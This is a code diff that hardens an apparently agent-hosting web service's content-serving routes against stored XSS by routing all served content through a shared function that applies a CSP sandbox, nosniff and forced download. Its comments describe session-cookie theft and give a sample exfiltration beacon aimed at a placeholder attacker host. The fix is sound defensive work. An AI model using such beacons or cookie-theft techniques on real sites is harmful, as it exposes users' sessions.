@@ -44,23 +44,35 @@ export const serveSharedEntry: RouteHandler = async (ctx) => {
 
 // === Egress: GET /o/:path — serve _outputs content ===
 
-// Egress content is agent-authored and served first-party (same origin as the
-// owner's authenticated session). An agent-chosen Content-Type of text/html or
-// image/svg+xml turns stored content into stored XSS that could steal the
-// owner's session cookie and drive /api/* — so served agent content must be
-// inert. We classify the (parameter-stripped) base type into three buckets:
-//   - inert types (SAFE_OUTPUT_MIME) pass through as-is.
-//   - active/renderable types (text/html, application/xhtml+xml, image/svg+xml,
-//     text/xml) DO render — the documented text/html egress feature — but are
-//     neutered with `Content-Security-Policy: sandbox` (see ACTIVE_OUTPUT_MIME).
+// === Served-content inertness (the ONE chokepoint) ===
+//
+// Every served egress path (`/o`, `/p`, `/f`) carries content whose Content-Type
+// is chosen by an *agent or uploader*, served first-party (same origin as the
+// owner's authenticated session). An attacker-chosen `text/html`/`image/svg+xml`
+// turns stored content into stored XSS that could steal the owner's `__session`
+// cookie and drive /api/*/mcp — so served content of an ACTIVE type must be made
+// inert. Rather than each serve path remembering its own guard (a block-list
+// fails open the moment one path forgets a sink), all of them derive their
+// security headers from `inertHeaders(contentType)` below. A new served path
+// inherits inertness by routing through it.
+//
+// We classify the (parameter-stripped) base type into three buckets:
+//   - inert types (SAFE_SERVED_MIME) pass through as-is, served inline.
+//   - active/renderable types (ACTIVE_SERVED_MIME: text/html, xhtml, svg, xml)
+//     are kept inert. Default policy renders them under `Content-Security-Policy:
+//     sandbox` (the documented text/html egress feature). A serve path that is a
+//     file store (`/f`) instead passes `forceAttachment` so active types download
+//     rather than render — still safe, and the right default for a file.
 //   - anything else / missing is forced to text/plain.
-// `nosniff` on every /o response stops the browser sniffing text/plain into HTML.
-const SAFE_OUTPUT_MIME = new Set([
+// `nosniff` rides on EVERY served response so the browser can't sniff a
+// text/plain (or octet-stream) body into HTML.
+const SAFE_SERVED_MIME = new Set([
   "text/plain",
   "text/csv",
   "text/markdown",
   "application/json",
   "application/xml",
+  "application/pdf",
   "image/png",
   "image/jpeg",
   "image/gif",
@@ -68,18 +80,58 @@ const SAFE_OUTPUT_MIME = new Set([
   "image/avif",
 ]);
 
-// Active/renderable types we allow but make inert via `Content-Security-Policy:
-// sandbox`. `sandbox` (with no allow-tokens) treats the response as a unique
-// opaque origin: scripts don't run, forms are disabled, and same-origin access
-// (cookies, /api/*) is severed — so agent-authored HTML/SVG renders for the
-// documented text/html egress feature yet can't execute script or steal the
-// owner's session. This is the floor that lets active egress be safe.
-const ACTIVE_OUTPUT_MIME = new Set([
+// Active/renderable types we make inert. `sandbox` (with no allow-tokens) treats
+// the response as a unique opaque origin: scripts don't run, forms are disabled,
+// and same-origin access (cookies, /api/*) is severed; `default-src 'none'` also
+// blocks every sub-resource so it can't beacon a secret out via
+// `<img src="//attacker/?leak">`. So agent-authored HTML/SVG renders for the
+// documented egress feature yet can't execute script or steal the owner's session.
+export const ACTIVE_SERVED_MIME = new Set([
   "text/html",
   "application/xhtml+xml",
   "image/svg+xml",
   "text/xml",
 ]);
+
+const SANDBOX_CSP = "sandbox; default-src 'none'";
+
+export type InertHeaders = {
+  /** The Content-Type to actually emit (safe → original; unknown → text/plain). */
+  contentType: string;
+  /** Whether the classified base type is in the active/dangerous bucket. */
+  active: boolean;
+  /** The security headers every served response must carry. */
+  headers: Record<string, string>;
+};
+
+/**
+ * The single inertness decision for served egress. Given the raw, possibly
+ * attacker-chosen Content-Type, return the Content-Type to emit plus the security
+ * headers that neutralize it. Active types are sandboxed (CSP) and, when
+ * `forceAttachment` is set (a file store like `/f`), also forced to download.
+ * Every result carries `X-Content-Type-Options: nosniff`.
+ */
+export function inertHeaders(
+  rawContentType: string | null | undefined,
+  opts: { forceAttachment?: boolean } = {},
+): InertHeaders {
+  const base = String(rawContentType || "").split(";")[0].trim().toLowerCase();
+  const headers: Record<string, string> = { "X-Content-Type-Options": "nosniff" };
+
+  if (SAFE_SERVED_MIME.has(base)) {
+    return { contentType: rawContentType as string, active: false, headers };
+  }
+  if (ACTIVE_SERVED_MIME.has(base)) {
+    // Inert either way: a unique opaque origin via CSP sandbox, AND — for a file
+    // store — forced to download instead of render. Both are XSS-safe; attachment
+    // is the right default for a file, sandbox the right default for egress HTML.
+    headers["Content-Security-Policy"] = SANDBOX_CSP;
+    if (opts.forceAttachment) headers["Content-Disposition"] = "attachment";
+    return { contentType: rawContentType as string, active: true, headers };
+  }
+  // Unknown / missing → the safest default: inert plain text.
+  return { contentType: "text/plain; charset=utf-8", active: false, headers };
+}
 
 export const serveOutput: RouteHandler = async (ctx) => {
   const raw = await ctx.hive.resolveOutput(ctx.params.path);
@@ -105,29 +157,16 @@ export const serveOutput: RouteHandler = async (ctx) => {
     return new Response(null, { status: 304 });
   }
 
-  // Normalize on the base type (strip ;charset etc.) for classification, but
-  // serve the ORIGINAL mime_type when allowed so a legit `application/json;
-  // charset=utf-8` keeps its charset instead of being downgraded.
-  const base = String(result.mime_type || "").split(";")[0].trim().toLowerCase();
-
+  // Inertness decision at the shared chokepoint: the original mime_type is
+  // preserved when safe (so a legit `application/json; charset=utf-8` keeps its
+  // charset), active types render under CSP sandbox, unknown → inert text/plain.
+  const inert = inertHeaders(result.mime_type);
   const headers: Record<string, string> = {
-    "X-Content-Type-Options": "nosniff",
+    ...inert.headers,
+    "Content-Type": inert.contentType,
     "ETag": etag,
     "Cache-Control": result.visibility === "public" ? "public, max-age=60" : "private, no-cache",
   };
-
-  if (SAFE_OUTPUT_MIME.has(base)) {
-    headers["Content-Type"] = result.mime_type;
-  } else if (ACTIVE_OUTPUT_MIME.has(base)) {
-    // Render the agent's HTML/SVG, but keep it inert: `sandbox` (no script/forms,
-    // unique opaque origin → no cookie/same-origin) AND `default-src 'none'`, which
-    // also blocks every sub-resource load so it can't beacon a secret out via
-    // `<img src="//attacker/?leak">`.
-    headers["Content-Type"] = result.mime_type;
-    headers["Content-Security-Policy"] = "sandbox; default-src 'none'";
-  } else {
-    headers["Content-Type"] = "text/plain; charset=utf-8";
-  }
 
   return new Response(result.content, { headers });
 };
@@ -188,19 +227,24 @@ export const servePublication: RouteHandler = async (ctx) => {
     return new Response(null, { status: 304 });
   }
 
+  // nosniff rides on every format (via the shared chokepoint); never let a text
+  // projection get sniffed into HTML.
   const headers: Record<string, string> = {
+    ...inertHeaders(result.content_type).headers,
     "Content-Type": result.content_type,
-    // nosniff is safe on every format; never let a text projection get sniffed.
-    "X-Content-Type-Options": "nosniff",
     "ETag": etag,
     "Cache-Control": result.visibility === "public" ? "public, max-age=60" : "private, no-cache",
   };
   // HTML publications carry owner-authored markup (template + css) served
-  // first-party. A restrictive CSP lets the inline owner CSS + images render
-  // but blocks any script execution, so a breakout can't run code.
+  // first-party. This CSP is the publication-specific shape: `default-src 'none'`
+  // blocks script, `style-src 'unsafe-inline'` + `img-src */font-src *` let the
+  // inline owner CSS and externally-embedded images render (a documented feature
+  // over already-public data), and `sandbox` is defense-in-depth same-origin
+  // isolation — even a parser breakout lands in a unique opaque origin with no
+  // cookie/same-origin/form access, so it can't reach the owner's session or /api.
   if (typeof result.content_type === "string" && result.content_type.startsWith("text/html")) {
     headers["Content-Security-Policy"] =
-      "default-src 'none'; style-src 'unsafe-inline'; img-src *; font-src *";
+      "sandbox; default-src 'none'; style-src 'unsafe-inline'; img-src *; font-src *";
   }
 
   return new Response(result.body, { headers });
@@ -336,18 +380,30 @@ export const serveDocument: RouteHandler = async (ctx) => {
     return new Response("Not found", { status: 404 });
   }
 
+  // The content_type came from the UPLOADER's request header (documents.ts), so a
+  // public doc uploaded as text/html would otherwise render as active script on
+  // the first-party origin → stored XSS. Route it through the shared inertness
+  // chokepoint with forceAttachment: safe types (pdf, images, text/plain) still
+  // view inline; ACTIVE types (html/svg/xml) are sandboxed AND forced to download
+  // — the right default for a file store. nosniff rides on every response.
+  const inert = inertHeaders(doc.content_type || "application/octet-stream", { forceAttachment: true });
+
   // Sanitize the title for the Content-Disposition filename (no quotes/CR/LF).
   const filename = String(doc.title || `document-${id}`).replace(/["\r\n]/g, "").slice(0, 200);
-  const disposition = ctx.url.searchParams.get("download") != null ? "attachment" : "inline";
+  // Explicit ?download forces attachment; otherwise honor the inertness verdict
+  // (active → attachment, safe → inline).
+  const wantsAttachment = ctx.url.searchParams.get("download") != null || inert.active;
+  const disposition = wantsAttachment ? "attachment" : "inline";
 
-  return new Response(object.body, {
-    headers: {
-      "Content-Type": doc.content_type || "application/octet-stream",
-      "Content-Disposition": `${disposition}; filename="${filename}"`,
-      "ETag": etag,
-      "Cache-Control": doc.visibility === "public" ? "public, max-age=60" : "private, no-cache",
-    },
-  });
+  const headers: Record<string, string> = {
+    ...inert.headers,
+    "Content-Type": inert.contentType,
+    "Content-Disposition": `${disposition}; filename="${filename}"`,
+    "ETag": etag,
+    "Cache-Control": doc.visibility === "public" ? "public, max-age=60" : "private, no-cache",
+  };
+
+  return new Response(object.body, { headers });
 };
 
 // === Export: GET /export/:pattern — download pattern as zip ===
